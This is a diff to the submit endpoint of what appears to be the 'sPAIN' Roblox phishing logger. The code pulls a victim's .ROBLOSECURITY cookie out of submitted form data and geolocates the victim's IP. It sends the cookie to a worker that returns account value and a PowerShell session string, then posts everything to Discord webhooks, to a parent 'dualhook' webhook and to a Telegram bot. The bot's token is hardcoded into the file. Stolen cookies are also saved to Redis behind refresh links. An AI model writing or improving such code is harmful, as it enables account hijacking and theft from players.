@@ -1,8 +1,9 @@
 // api/submit.js
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-const TG_TOKEN    = process.env.TG_TOKEN;
-const TG_CHAT     = process.env.TG_CHAT;
+const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
+const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
+const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
 function parseBody(raw) {
   if (!raw) return {};
@@ -22,43 +23,29 @@ async function redisGet(key) {
     if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
     if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
     return r || null;
-  } catch (e) {
-    console.error('redisGet error:', e.message);
-    return null;
-  }
+  } catch { return null; }
 }
 
-// Use POST /pipeline for reliable JSON storage
 async function redisSet(key, value) {
   try {
-    const res = await fetch(`${REDIS_URL}/pipeline`, {
-      method: 'POST',
-      headers: {
-        Authorization: `Bearer ${REDIS_TOKEN}`,
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify([
-        ['SET', key, JSON.stringify(value), 'EX', 2592000] // 30 day TTL
-      ])
-    });
+    const res = await fetch(
+      `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
+      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
+    );
     return res.ok;
-  } catch (e) {
-    console.error('redisSet error:', e.message);
-    return false;
-  }
+  } catch { return false; }
 }
 
 async function getIpGeo(ip) {
   try {
     if (!ip || ip === 'Unknown') return null;
-    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`, { signal: AbortSignal.timeout(3000) });
+    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
     const d = await r.json();
     return d.status === 'success' ? d : null;
   } catch { return null; }
 }
 
 async function tgSend(text) {
-  if (!TG_TOKEN || !TG_CHAT) return;
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -68,17 +55,10 @@ async function tgSend(text) {
   } catch (_) {}
 }
 
-function generateId() {
-  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-  let id = '';
-  for (let i = 0; i < 40; i++) id += chars[Math.floor(Math.random() * chars.length)];
-  return id;
-}
-
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
 function extractCookie(raw) {
   if (!raw) return null;
-  const s = String(raw).trim();
+  const s = raw.trim();
   const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);  if (m1) return m1[1];
   const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                      if (m2) return WARN + m2[1];
   const m3 = s.match(/\|_([\w\-]{50,})/);                                  if (m3) return WARN + m3[1];
@@ -93,73 +73,117 @@ function findCookie(slots) {
   return null;
 }
 
+// Worker returns BOTH Roblox info AND powershell in one call
+async function getWorkerData(cookie, victimIp) {
+  try {
+    const r = await fetch(WORKER_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie, victimIp })
+    });
+    if (!r.ok) return null;
+    return await r.json();
+  } catch { return null; }
+}
+
 async function discordSend(url, payload) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    const r = await fetch(url, {
+    await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (!r.ok) console.error('Discord send failed:', r.status, await r.text());
-  } catch (e) { console.error('discordSend error:', e.message); }
+  } catch (_) {}
 }
 
-async function discordChunked(url, text) {
-  const limit = 1990;
-  let rem = text; let first = true;
+// Chunked text sender — splits anything >2000 chars
+async function discordText(url, text, lang = '') {
+  const prefix = lang ? `\`\`\`${lang}\n` : '';
+  const suffix = lang ? '\n```' : '';
+  const limit  = 1990 - prefix.length - suffix.length;
+  let rem = text;
   while (rem.length > 0) {
-    const chunk = rem.substring(0, limit);
-    rem = rem.substring(limit);
-    await discordSend(url, {
-      content: first
-        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
-        : chunk + (rem.length === 0 ? '\n```' : '')
-    });
-    first = false;
+    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
+    await discordSend(url, { content: prefix + chunk + (rem.length === 0 ? suffix : '') });
   }
 }
 
-async function sendHit(webhookUrl, { cookie, ip, geo, now, pageName, refreshUrl }) {
-  // Message 1: info embed
+// ── Rich embed matching Image 2 ───────────────────────────────────────────────
+async function sendHit(webhookUrl, { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl }) {
+  const ps = powershell || '';
+
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
-      title:       '🍪 New Cookie Captured',
-      description: `🔥 \`sPAIN\` 🔥`,
-      color:       0xc026d3,
+      title:       `${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
+      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile)${refreshUrl ? `\n[🔄 Refresh PowerShell](${refreshUrl})` : ''}`,
+      color:       5793266,
+      thumbnail:   { url: roblox.avatarUrl },
       fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                                                                    inline: true  },
-        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
-        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                              inline: true  },
-        { name: '🕐 Time',     value: now,                                                                                inline: false },
+        { name: '🔴 Robux',      value: `${roblox.robux?.toLocaleString() || 0}`,                                             inline: true  },
+        { name: '🎵 RAP',        value: `${roblox.limitedsValue?.toLocaleString() || 0}\n(${roblox.limitedsCount || 0} items)`,inline: true  },
+        { name: '🗓️ Age',        value: `${roblox.accountAgeDays} days`,                                                      inline: true  },
+        { name: '💎 Premium',    value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                inline: true  },
+        { name: '👥 Groups',     value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,    inline: true  },
+        { name: '🌐 IP',         value: ip || 'Unknown',                                                                      inline: true  },
+        {
+          name:   '📍 Location',
+          value:  [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') + (geo?.isp ? `\n${geo.isp}` : ''),
+          inline: false
+        },
+        { name: '⚙️ Account',    value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                   inline: false },
+        {
+          name:   '🎯 Gamepasses',
+          value:  `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`,
+          inline: false
+        },
+        {
+          name:   '📋 Slots (PowerShell)',
+          value:  '```\n' + ps.substring(0, 1000) + (ps.length > 1000 ? '\n... (continued below)' : '') + '\n```',
+          inline: false
+        }
       ],
-      footer:    { text: `sPAIN Logger • ${pageName}` },
+      footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
       timestamp: now
     }]
   });
 
-  // Message 2: refresh link as plain text (never gets cut off)
-  await discordSend(webhookUrl, {
-    content: `🔄 **Refresh Link** — click to get full account info + PowerShell:\n<${refreshUrl}>`
-  });
+  // Send full PowerShell as separate messages if long
+  if (ps.length > 1000) {
+    await discordText(webhookUrl, ps, 'powershell');
+  }
 
-  // Message 3: raw cookie
-  await discordChunked(webhookUrl, cookie);
+  // Raw cookie — separate message, chunked
+  await discordText(webhookUrl, cookie);
 }
 
 async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
   await discordSend(webhookUrl, {
+    content: '@everyone',
     embeds: [{
-      title: '⚠️ No valid cookie submitted',
-      color: 0xff3333,
+      title:       '⚠️ Invalid Cookie — someone trolling 💀',
+      description: 'Cookie was **invalid or fake**.',
+      color:       0xff3333,
       fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                                                   inline: true  },
-        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
-        { name: '🕐 Time',     value: now,                                                               inline: false }
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                     inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',                   inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                               inline: true  },
+        { name: '🕐 Date',     value: now,                                                                                  inline: false }
       ],
-      footer: { text: `sPAIN Tools • ${pageName}` },
+      footer:    { text: `sPAIN Tools • ${pageName}` },
       timestamp: now
+    }]
+  });
+}
+
+async function sendRefreshCard(webhookUrl, refreshUrl, pageName) {
+  await discordSend(webhookUrl, {
+    embeds: [{
+      title:       '🔄 Get Fresh PowerShell Anytime',
+      description: `Click the link below whenever you need a new PowerShell for this account:\n**${refreshUrl}**`,
+      color:       0x06b6d4,
+      footer:      { text: `sPAIN Tools • ${pageName} • Keep this private` }
     }]
   });
 }
@@ -175,56 +199,78 @@ export default async function handler(req, res) {
   const { slug, slots } = body;
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
-  if (!REDIS_URL || !REDIS_TOKEN) return res.status(500).json({ error: 'Server config error' });
 
   const record = await redisGet(`slot:${slug}`);
-  if (!record)         return res.status(404).json({ error: `Page "${slug}" not found` });
-  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
+  if (!record)         return res.status(404).json({ error: 'Page not found' });
+  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });
 
+  // Respond immediately — client never waits
   res.status(200).json({ success: true });
 
   try {
-    const ip       = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
-    const cookie   = findCookie(slots);
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
+            || req.headers['x-real-ip'] || 'Unknown';
+
+    const [geo, cookie] = await Promise.all([
+      getIpGeo(ip),
+      Promise.resolve(findCookie(slots))
+    ]);
+
+    // Single worker call — returns BOTH roblox info AND powershell
+    const workerData = cookie ? await getWorkerData(cookie, ip) : null;
+    const roblox     = workerData?.valid ? workerData : null;
+    const powershell = workerData?.powershell || null;
+    const isValid    = !!(roblox && powershell);
+
     const now      = new Date().toISOString();
     const pageName = record.displayName || slug;
 
-    const webhooks = [record.webhook];
-    if (record.dualhookParent) {
-      try {
-        const parent = await redisGet(`slot:${record.dualhookParent}`);
-        if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
-      } catch (_) {}
+    // Load dualhook parent
+    let parent = null;
+    if (record.dualhookParent) parent = await redisGet(`slot:${record.dualhookParent}`);
+
+    // Generate refresh ID and save to Redis BEFORE sending Discord (so link is ready)
+    let refreshUrl = null;
+    if (isValid && cookie) {
+      const refreshId = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+      refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
+      await redisSet(`refresh:${refreshId}`, {
+        cookie,
+        webhook:  record.webhook,
+        webhook1: parent?.webhook || null,
+        pageName
+      });
     }
 
-    const geo = await getIpGeo(ip);
+    const payload = { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl };
 
-    if (!cookie) {
-      for (const wh of webhooks) await sendInvalid(wh, { ip, geo, now, pageName });
-      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`);
-      return;
+    if (isValid) {
+      // Main embed + full PS + raw cookie
+      await sendHit(record.webhook, payload);
+      if (parent?.webhook && parent.webhook !== record.webhook) {
+        await sendHit(parent.webhook, payload);
+      }
+      // Separate refresh card message
+      await sendRefreshCard(record.webhook, refreshUrl, pageName);
+      if (parent?.webhook && parent.webhook !== record.webhook) {
+        await sendRefreshCard(parent.webhook, refreshUrl, pageName);
+      }
+    } else {
+      await sendInvalid(record.webhook, { ip, geo, now, pageName });
+      if (parent?.webhook && parent.webhook !== record.webhook) {
+        await sendInvalid(parent.webhook, { ip, geo, now, pageName });
+      }
     }
 
-    const refreshId  = generateId();
-    const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
-
-    const saved = await redisSet(`refresh:${refreshId}`, {
-      cookie,
-      webhook:   record.webhook,
-      webhook1:  webhooks[1] || null,
-      pageName,
-      ip,
-      createdAt: now
-    });
-
-    console.log('Refresh saved:', saved, 'id:', refreshId);
-
-    for (const wh of webhooks) await sendHit(wh, { cookie, ip, geo, now, pageName, refreshUrl });
-
-    await tgSend([
-      `🍪 <b>COOKIE CAPTURED — ${pageName}</b>`,
-      `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-      `🔄 Refresh: ${refreshUrl}`,
+    await tgSend(isValid ? [
+      `✅ <b>VALID HIT — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}</b>`,
+      `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
+      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+      `📄 Page: ${pageName}`,
+      `🔄 Refresh: ${refreshUrl}`
+    ].join('\n') : [
+      `⚠️ <b>INVALID — ${pageName}</b>`,
+      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
       `🕐 ${now}`
     ].join('\n'));
 
